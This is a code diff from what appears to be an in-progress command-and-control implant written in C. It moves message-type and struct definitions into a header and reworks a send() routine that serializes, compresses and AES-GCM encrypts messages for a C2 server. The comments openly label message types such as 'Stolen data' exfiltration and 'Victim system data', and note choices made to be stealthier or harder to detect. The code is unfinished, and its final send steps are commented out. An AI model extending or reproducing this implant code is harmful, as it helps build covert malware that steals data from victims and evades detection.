@@ -12,6 +12,7 @@
 // send Base64(IV + CipherText + Tag)
 
 
+#include "MessageTypes.h"
 
 // RSA
 /* NOTE: private key should only be on server
@@ -54,37 +55,7 @@ EVP_PKEY* load_private_key(const char* filename) {
 // createHeader() ?
 
 
-/*
-STRUCT C2Message:
-message_id: String = GENERATE_UUID()
-victim_id: String
-timestamp: Long
-message_type: Enum = [
-	HANDSHAKE,           Initial connection
-	HEARTBEAT,          // Regular check-in
-	SYSTEM_INFO,        // Victim system data
-	COMMAND_RESULT,     // Output from executed command
-	DATA_EXFIL,         // Stolen data
-	FILE_UPLOAD,        // File transfer
-	ERROR_REPORT        // Error information
 
-]
-payload: EncryptedData
-compression: Boolean
-priority: Integer
-END STRUCT
-*/
-
-/*
-typedef struct {
-	bool use_compression;
-	SerializationType serialization_type;
-	ProtocolType protocol;
-	CryptoKey crypto_key;
-	Endpoint server_endpoint;
-
-} Config;
-*/
 
 // TODO: eventually should use custom struct instead of json
 // b64 encoding is only needed in text-only protocols (http)
@@ -93,75 +64,41 @@ typedef struct {
 // json / custom struct -> compress (if needed) -> serialize -> encrypt (+ hmac if encryption doesn't have builtin auth) -> tlv -> send?
 
 
-/*
-struct Name
-{
-	// stuff
-};
-typedef Name NewName
-*/
 
 
 
 ///////////////////////////////////////////////
 
 
-enum MessageType
-{
-	HANDSHAKE,          // Initial connection
-	HEARTBEAT,          // Regular check-in
-	SYSTEM_INFO,        // Victim system data
-	COMMAND_RESULT,     // Output from executed command
-	DATA_EXFIL,         // Stolen data
-	FILE_UPLOAD,        // File transfer
-	ERROR_REPORT        // Error information
 
-};
-
-
-struct MessageHeader
-{
-	MessageType messageType;
-	//ULONG messageId; ?
-	//ULONG payloadSize; // MessageDataSize
-	//ULONG checksum; ?
-
-};
-
-
-// NOTE: InternalMessage will have to serialize,encrypt,enocde,...etc both the header and payload separately? then combine them together into one array?
-// ex: serialize(InternalMessage) wont work, need to do serialize(InternalMessage.header) + serialize(InternalMessage.payload)
-// NOTE: this stuct will be easier to detect (struct containing structs), instead of just having the raw fields listed out
-struct InternalMessage 
-{
-	MessageHeader header; // the header... always use custom header? no need for tlv... MessageType enum should be defined in header
-	//MessageData payload; // the actual payload
-	BYTE payload[4096]; // TODO: shouldn't be fixed size?
-}; 
 
 
 // NOTE: Config is the config that comes from the C2 profile
 // return non-zero on error
-int send(MessageData* data, Config* config)
+int send(InternalMessage* msg, Config* config) // TODO: def rename this function so it is more clear
 {
  	// stealthier than creating a Buffer struct
 	// other option would be to create multiple buffers to avoid single large allocation
 	uint8_t buf = {0};
 
 	// 1. Serialize
-	serialize_data(data, &buf, config->serialization_type); // TODO: check return type if there were any errors
+	serializeData(msg, &buf, config->serializationType); // TODO: check return type if there were any errors
 
 	// 2. Compress (optional)
-	compress_if_needed(&buf, config->use_compression);
+	// compress_if_needed(&buf, config->use_compression);
+	if (config->compressData)
+	{
+		compressData(&buf);
+	}
 
 	// 3. Encrypt + Authenticate (GCM does both)
 	aes_gcm_encrypt(&buf, config->crypto_key);
 
 	// 4. Package with auth tag (if encryption doesn't have auth stuff?)... (TLV or encode) 
-	package_with_auth_tag(&buf, config->protocol);
+	// package_with_auth_tag(&buf, config->protocol);
 
 	// 5. Send
-	send_data(&buf, config->server_endpoint);
+	// send_data(&buf, config->server_endpoint);
 
 	// cleanup: free buf
 	return 0;
